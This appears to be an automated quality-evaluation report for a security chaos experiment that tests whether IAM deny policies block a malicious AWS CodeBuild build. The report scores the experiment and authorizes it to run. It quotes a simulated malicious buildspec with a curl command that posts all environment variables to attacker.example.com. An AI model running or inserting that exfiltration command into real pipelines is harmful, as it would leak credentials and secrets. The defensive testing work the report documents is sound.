# PRE-EXECUTION QUALITY EVALUATION REPORT

## Experiment Information
- **SCE Node**: 1.8 SCE Experiment
- **Probe Type**: Preventive
- **Attack Nodes**: 1.7 Start Malicious Build
- **Evaluation Date**: 2024-01-15

## Factor 1: ACTION ↔ Attack Correspondence
**Score**: 100

**Justification**: 

The experiment demonstrates full correspondence between the ADT attack node 1.7 "Start Malicious Build" and the implementation:

1. **Tactic Alignment**: The ADT specifies the attack uses `aws codebuild start-build` command, which is exactly what the `attack()` function implements:
   ```python
   response = attacker_codebuild.start_build(
       projectName=project_name,
       buildspecOverride=malicious_buildspec,
       sourceTypeOverride='NO_SOURCE'
   )
   ```

2. **Technique Alignment**: The ADT specifies TTP T1098.001 (Account Manipulation) with a "Credential exposure attempt" as the result. The implementation creates a malicious buildspec that attempts to exfiltrate credentials:
   ```python
   malicious_buildspec = """
   version: 0.2
   phases:
     build:
       commands:
         - echo "MALICIOUS: Attempting to exfiltrate secrets"
         - curl -X POST http://attacker.example.com/exfil -d "$(env)"
   """
   ```

3. **Implementation Quality**: 
   - Uses proper role assumption for attacker simulation
   - Captures evidence of attack attempt (success or failure)
   - Properly handles the malicious buildspec override scenario
   - Includes immediate remediation if attack succeeds (stops the build)

---

## Factor 2: Defense ↔ Defense Correspondence
**Score**: 100

**Justification**:

The experiment fully implements the preventive defense node 1.6 "Metadata Service Protection" concept adapted for build initiation, and aligns with the SCE node 1.8's preventive probe question "Can build initiation be blocked?":

1. **ADT Defense Node Correspondence**: The ADT node 1.6 specifies:
   - Classification: Preventive
   - Strategy: Restricted access controls
   - Mechanism: Session-oriented/fine-grained control

   The implementation deploys IAM-based preventive controls:
   ```python
   "AttackerPreventivePolicy": {
       "Statement": [
           {
               "Sid": "PreventMaliciousBuildWithOverride",
               "Effect": "Deny",
               "Action": ["codebuild:StartBuild", "codebuild:StartBuildBatch"],
               "Resource": "*",
               "Condition": {"StringLike": {"codebuild:BuildSpec": "*"}}
           },
           {
               "Sid": "DenyStartBuildExplicit",
               "Effect": "Deny",
               "Action": ["codebuild:StartBuild", "codebuild:StartBuildBatch"],
               "Resource": "*"
           }
       ]
   }
   ```

2. **Code Quality**:
   - Uses CloudFormation for infrastructure-as-code deployment
   - Implements proper IAM deny policies with conditions
   - Creates appropriate separation between legitimate and attacker roles
   - Includes proper resource tagging for traceability
   - Uses wait mechanisms for IAM propagation

3. **Defense Mechanism**: The preventive control uses explicit IAM deny statements to block `StartBuild` and `StartBuildBatch` actions, particularly when buildspec overrides are attempted - directly addressing the malicious build execution scenario.

---

## Factor 3: PROBE ↔ Defensive Intent Correspondence
**Score**: 100

**Justification**:

The probe (hypothesis verification) fully corresponds to the defensive intent specified in the ADT:

1. **ADT Defensive Intent**: SCE Node 1.8 specifies:
   - **Preventive Probe**: "Can build initiation be blocked?"
   
2. **Implementation Alignment**: The `hypothesis_verification()` function directly validates this intent:

   ```python
   def hypothesis_verification():
       """
       Verify that the preventive control successfully blocked the malicious build.
       
       Returns True if:
       - The attack was attempted
       - The attack was blocked by IAM deny policy (AccessDeniedException)
       - No malicious build was actually started
       """
   ```

3. **Verification Completeness**:
   - **Check 1**: Confirms attack was attempted (`EXPERIMENT_STATE.get('attack_attempted')`)
   - **Check 2**: Verifies no builds were started via CodeBuild API
   - **Check 3**: Validates IAM deny policy exists with correct statements
   - **Check 4**: Checks for AccessDeniedException and CloudTrail evidence
   
4. **Evidence Collection**: The probe collects multiple forms of evidence:
   - Direct API error responses (AccessDeniedException)
   - Build status checks via CodeBuild
   - IAM policy verification
   - CloudTrail event lookup for StartBuild denials

5. **Manifest Alignment**: The experiment manifest correctly specifies:
   ```json
   "steady-state-hypothesis": {
       "title": "Preventive control blocks malicious build attempts",
       "probes": [{
           "name": "verify-malicious-build-blocked",
           "tolerance": true
       }]
   }
   ```

---

## FINAL SCORE CALCULATION

**Q_pre = 0.40 × [f1] + 0.30 × [f2] + 0.30 × [f3]**

**Q_pre = 0.40 × 100 + 0.30 × 100 + 0.30 × 100**

Q_pre = 100.00

**Threshold**: 80
**Result**: Q_pre >= 80

## DECISION

**AUTHORIZE EXECUTION**

The experiment demonstrates excellent quality across all evaluation factors:

1. **Attack Implementation (f1=100)**: Perfect correspondence between ADT attack node and implementation, using the exact same AWS API call with appropriate malicious payload simulation.

2. **Defense Implementation (f2=100)**: Comprehensive preventive control using IAM deny policies that directly address the build initiation blocking requirement, with high-quality infrastructure-as-code deployment.

3. **Probe Correspondence (f3=100)**: The hypothesis verification fully aligns with the defensive intent "Can build initiation be blocked?" and includes multi-layered evidence collection.

---

## Recommendations

While the experiment meets all quality thresholds, minor enhancements could include:

1. **Enhanced Logging**: Consider adding structured logging output for easier post-experiment analysis.

2. **Timeout Configuration**: The CloudFormation wait timeout of 300 seconds could be made configurable via environment variables.

3. **Additional Evidence Sources**: Consider integrating AWS Security Hub findings or GuardDuty alerts if enabled in the environment.

4. **Experiment Metadata**: Consider adding experiment versioning to track iterations of the SCE experiment.